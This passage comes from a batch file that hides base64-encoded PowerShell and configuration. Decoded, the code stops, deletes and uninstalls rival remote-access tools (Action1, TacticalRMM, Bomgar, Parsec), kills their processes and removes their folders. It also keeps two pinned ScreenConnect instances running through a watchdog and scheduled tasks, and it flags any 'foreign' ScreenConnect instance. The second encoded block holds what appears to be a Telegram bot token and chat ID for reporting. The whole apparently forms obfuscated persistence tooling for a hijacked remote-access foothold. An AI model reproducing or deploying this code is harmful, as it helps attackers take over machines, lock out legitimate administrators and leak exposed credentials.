J0FjdGlvbjEnOyAgICAgU3ZjPUAoJ0FjdGlvbjEqJyk7IFByb2M9QCgnQWN0aW9uMSonKTsgRGly
cz1AKCIkZW52OlByb2dyYW1GaWxlc1xBY3Rpb24xIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
XEFjdGlvbjEiLCIkZW52OlByb2dyYW1EYXRhXEFjdGlvbjEiKTsgUHJvZD1AKCdBY3Rpb24xKicp
IH0KICAgICAgICBAeyBUYWc9J1RhY3RpY2FsUk1NJzsgU3ZjPUAoJ3RhY3RpY2Fscm1tKicsJ01l
c2ggQWdlbnQnKTsgUHJvYz1AKCd0YWN0aWNhbHJtbSonLCdtZXNoYWdlbnQqJyk7IERpcnM9QCgi
JGVudjpQcm9ncmFtRmlsZXNcVGFjdGljYWxBZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
fVxUYWN0aWNhbEFnZW50Iik7IFByb2Q9QCgnVGFjdGljYWwqJywnTWVzaCBBZ2VudConKSB9CiAg
ICAgICAgQHsgVGFnPSdCb21nYXInOyAgICAgIFN2Yz1AKCdib21nYXIqJywnQmV5b25kVHJ1c3Qq
Jyk7IFByb2M9QCgnYm9tZ2FyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEJvbWdhciIs
IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxCb21nYXIiKTsgUHJvZD1AKCdCb21nYXIqJywnQmV5
b25kVHJ1c3QqJykgfQogICAgICAgIEB7IFRhZz0nUGFyc2VjJzsgICAgICBTdmM9QCgnUGFyc2Vj
KicpOyBQcm9jPUAoJ3BhcnNlY2QqJywncHNlcnZpY2UqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFt
RmlsZXNcUGFyc2VjIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFBhcnNlYyIsIiRlbnY6UHJv
Z3JhbURhdGFcUGFyc2VjIik7IFByb2Q9QCgnUGFyc2VjKicpIH0KICAgICkKICAgIGZvcmVhY2gg
KCR0b29sIGluICRybW0pIHsKICAgICAgICAkaGl0ID0gJGZhbHNlCiAgICAgICAgZm9yZWFjaCAo
JHBhdCBpbiAkdG9vbC5Qcm9kKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKCRyb290IGluICRzY3Jp
cHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAgICAgICAgICAgICAgIEdldC1DaGlsZEl0ZW0gJHJvb3Qg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAg
ICAgICAgICAgICAgJGRuID0gKEdldC1JdGVtUHJvcGVydHkgJF8uUFNQYXRoIC1FcnJvckFjdGlv
biBTaWxlbnRseUNvbnRpbnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAgICAgICAgICAgIGlmICgk
ZG4gLWFuZCAkZG4gLWxpa2UgJHBhdCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoVW5p
bnN0YWxsLVByb2R1Y3RLZXkgJF8pIHsgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZSB9CiAgICAgICAg
ICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQog
ICAgICAgIGZvcmVhY2ggKCRwYXQgaW4gJHRvb2wuU3ZjKSB7CiAgICAgICAgICAgIEdldC1TZXJ2
aWNlIC1OYW1lICRwYXQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9i
amVjdCB7CiAgICAgICAgICAgICAgICAmIHNjLmV4ZSBzdG9wICIkKCRfLk5hbWUpIiAyPiYxIHwg
T3V0LU51bGwKICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNTAwCiAg
ICAgICAgICAgICAgICAmIHNjLmV4ZSBkZWxldGUgIiQoJF8uTmFtZSkiIDI+JjEgfCBPdXQtTnVs
bAogICAgICAgICAgICAgICAgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fc3ZjX2Rl
bGV0ZWQgJCgkXy5OYW1lKSBbJCgkdG9vbC5UYWcpXSIKICAgICAgICAgICAgfQogICAgICAgIH0K
ICAgICAgICBmb3JlYWNoICgkcGF0IGluICR0b29sLlByb2MpIHsKICAgICAgICAgICAgR2V0LVBy
b2Nlc3MgLU5hbWUgJHBhdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gt
T2JqZWN0IHsKICAgICAgICAgICAgICAgIFN0b3AtUHJvY2VzcyAtSWQgJF8uSWQgLUZvcmNlIC1F
cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgICAgICAkbi5ybW0rKzsgJGhp
dCA9ICR0cnVlOyBMb2cgInJtbV9wcm9jX2tpbGxlZCAkKCRfLlByb2Nlc3NOYW1lKSBbJCgkdG9v
bC5UYWcpXSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBmb3JlYWNoICgkZCBpbiAk
dG9vbC5EaXJzKSB7CiAgICAgICAgICAgIGlmICgkZCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQ
YXRoICRkKSkgewogICAgICAgICAgICAgICAgaWYgKEZvcmNlLVJlbW92ZURpciAkZCkgeyAkbi5y
bW0rKzsgJGhpdCA9ICR0cnVlOyBMb2cgInJtbV9kaXJfcmVtb3ZlZCAkZCIgfQogICAgICAgICAg
ICAgICAgZWxzZSB7ICRuLmZhaWwrKzsgTG9nICJybW1fZGlyX1JFTU9WRV9GQUlMRUQgJGQiIH0K
ICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoJGhpdCkgeyBMb2cgInJtbV9leHRl
cm1pbmF0ZWQgJCgkdG9vbC5UYWcpIiB9CiAgICB9CgogICAgJHN1bW1hcnkgPSAiZXh0ZXJtaW5h
dGUgc3ZjPSQoJG4uc3ZjKSBwcm9jPSQoJG4ucHJvYykgZGlyPSQoJG4uZGlyKSBwcm9kdWN0PSQo
JG4ucHJvZHVjdCkgcm1tPSQoJG4ucm1tKSBmYWlsPSQoJG4uZmFpbCkiCiAgICBMb2cgJHN1bW1h
cnkKICAgIHJldHVybiAkc3VtbWFyeQp9CgpmdW5jdGlvbiBVcGRhdGUtU3RhdGUgewogICAgJHBy
aW0gPSAkbnVsbDsgJGFsdCA9ICRudWxsCiAgICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2Vydmlj
ZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJykpIHsKICAgICAgICBpZiAoJHN2Yy5OYW1l
IC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJykgewogICAgICAgICAgICBpZiAoJG1hdGNoZXNb
MV0gLWVxICc1ZjYwMTA1Nzk4NTJlNTA3JykgeyAkcHJpbSA9ICIkKCRzdmMuU3RhdHVzKSIgfQog
ICAgICAgICAgICBlbHNlaWYgKCRtYXRjaGVzWzFdIC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsg
JGFsdCA9ICIkKCRzdmMuU3RhdHVzKSIgfQogICAgICAgIH0KICAgIH0KICAgICRmb3JlaWduID0g
QCgpCiAgICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVj
dCBDbGllbnQqJykpIHsKICAgICAgICBpZiAoJHN2Yy5OYW1lIC1tYXRjaCAnXCgoWzAtOWEtZl17
MTZ9KVwpJyAtYW5kICRtYXRjaGVzWzFdIC1ub3RpbiBAKCc1ZjYwMTA1Nzk4NTJlNTA3JywnZjg2
MWM4MTQwZDQ1MzQyNycpKSB7CiAgICAgICAgICAgICRmb3JlaWduICs9ICRtYXRjaGVzWzFdCiAg
ICAgICAgfQogICAgfQogICAgJGlkID0gUmVhZC1JZGVudGl0eQogICAgJHRhc2tzT2sgPSAwOyAk
dGFza3NUb3RhbCA9IDAKICAgIGZvcmVhY2ggKCRrIGluICdUQVNLX0EnLCdUQVNLX0InLCdUQVNL
X0MnLCdUQVNLX0QnKSB7CiAgICAgICAgJHRhc2tzVG90YWwrKwogICAgICAgICR0biA9IFtzdHJp
bmddJGlkWyRrXQogICAgICAgIGlmICgtbm90ICR0bikgeyBjb250aW51ZSB9CiAgICAgICAgIyBk
byBOT1QgcGlwZSB0byBPdXQtTnVsbCAtIHRoYXQgY2xlYXJzIExBU1RFWElUQ09ERSBvbiBQUyA1
LjEKICAgICAgICBjbWQuZXhlIC9jICJzY2h0YXNrcyAvUXVlcnkgL1ROIGAiJHRuYCIgPm51bCAy
PiYxIgogICAgICAgIGlmICgkTEFTVEVYSVRDT0RFIC1lcSAwKSB7ICR0YXNrc09rKysgfQogICAg
fQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgJE1vblBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIg
J293bl9tb24uY21kJyB9CiAgICAkd2QgPSBFbnN1cmUtV2F0Y2hkb2cKICAgICRwcmV2ID0gQHt9
CiAgICAkc3RhdGVQYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdzdGF0ZS5qc29uJwogICAgaWYg
KFRlc3QtUGF0aCAkc3RhdGVQYXRoKSB7CiAgICAgICAgdHJ5IHsgKEdldC1Db250ZW50IC1MaXRl
cmFsUGF0aCAkc3RhdGVQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uKS5QU09iamVjdC5Qcm9w
ZXJ0aWVzIHwgRm9yRWFjaC1PYmplY3QgeyAkcHJldlskXy5OYW1lXSA9ICRfLlZhbHVlIH0gfSBj
YXRjaCB7fQogICAgfQogICAgJGluc3RhbGxDb3VudCA9IDEKICAgIGlmICgkcHJldi5pbnN0YWxs
Q291bnQpIHsgJGluc3RhbGxDb3VudCA9IFtpbnRdJHByZXYuaW5zdGFsbENvdW50IH0KICAgIGlm
ICgkcHJldi5wcmltIC1hbmQgJHByZXYucHJpbSAtbmUgJ1J1bm5pbmcnIC1hbmQgJHByaW0gLWVx
ICdSdW5uaW5nJykgeyAkaW5zdGFsbENvdW50KysgfQogICAgJHN0YXRlID0gW29yZGVyZWRdQHsK
ICAgICAgICBob3N0ICAgICAgICAgPSAkZW52OkNPTVBVVEVSTkFNRQogICAgICAgIHRzICAgICAg
ICAgICA9IChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28nKQogICAgICAg
IGJ1aWxkICAgICAgICA9ICRCdWlsZAogICAgICAgIHByaW0gICAgICAgICA9ICQoaWYgKCRwcmlt
KSB7ICRwcmltIH0gZWxzZSB7ICdNSVNTSU5HJyB9KQogICAgICAgIGFsdCAgICAgICAgICA9ICQo
aWYgKCRhbHQpIHsgJGFsdCB9IGVsc2UgeyAnTUlTU0lORycgfSkKICAgICAgICBmb3JlaWduICAg
ICAgPSAkZm9yZWlnbgogICAgICAgIHRhc2tzT2sgICAgICA9ICR0YXNrc09rCiAgICAgICAgdGFz
a3NUb3RhbCAgID0gJHRhc2tzVG90YWwKICAgICAgICB3YXRjaGRvZyAgICAgPSAkd2QKICAgICAg
ICBpbnN0YWxsQ291bnQgPSAkaW5zdGFsbENvdW50CiAgICAgICAgbGFzdEhlYWwgICAgID0gJChp
ZiAoJEV4dHJhKSB7IChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28nKSB9
IGVsc2VpZiAoJHByZXYubGFzdEhlYWwpIHsgJHByZXYubGFzdEhlYWwgfSBlbHNlIHsgJG51bGwg
fSkKICAgICAgICBub3RlICAgICAgICAgPSAkRXh0cmEKICAgIH0KICAgICgkc3RhdGUgfCBDb252
ZXJ0VG8tSnNvbiAtQ29tcHJlc3MpIHwgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRzdGF0ZVBh
dGggLUZvcmNlCiAgICByZXR1cm4gJHN0YXRlCn0KCnN3aXRjaCAoJEFjdGlvbikgewogICAgJ2lu
aXQnICAgICAgICAgICAgeyAkaWQgPSBJbml0aWFsaXplLUlkZW50aXR5OyAkaWQuR2V0RW51bWVy
YXRvcigpIHwgRm9yRWFjaC1PYmplY3QgeyAiJCgkXy5LZXkpPSQoJF8uVmFsdWUpIiB9IH0KICAg
ICdpZGVudGl0eScgICAgICAgIHsgJGlkID0gUmVhZC1JZGVudGl0eTsgJGlkLkdldEVudW1lcmF0
b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8uS2V5KT0kKCRfLlZhbHVlKSIgfSB9CiAgICAn
d2F0Y2hkb2cnICAgICAgICB7IEluc3RhbGwtV2F0Y2hkb2cgfCBPdXQtTnVsbCB9CiAgICAnd2F0
Y2hkb2ctZW5zdXJlJyB7IEVuc3VyZS1XYXRjaGRvZyB9CiAgICAnc3RhdGUnICAgICAgICAgICB7
IFVwZGF0ZS1TdGF0ZSB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVzcyB9CiAgICAncmVwYWlyJyAg
ICAgICAgICB7IFJlcGFpci1TQ1NlcnZpY2UgJEZwIH0KICAgICdyZWdpc3RlcmVkJyAgICAgIHsg
VGVzdC1TQ1JlZ2lzdGVyZWQgJEZwIH0KICAgICdleHRlcm1pbmF0ZScgICAgIHsgSW52b2tlLUV4
dGVybWluYXRlIH0KfQo=
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcN
CkNIQVRfSUQ9NzU0NzQ2MjA3MA0K
::B64_NTF_END
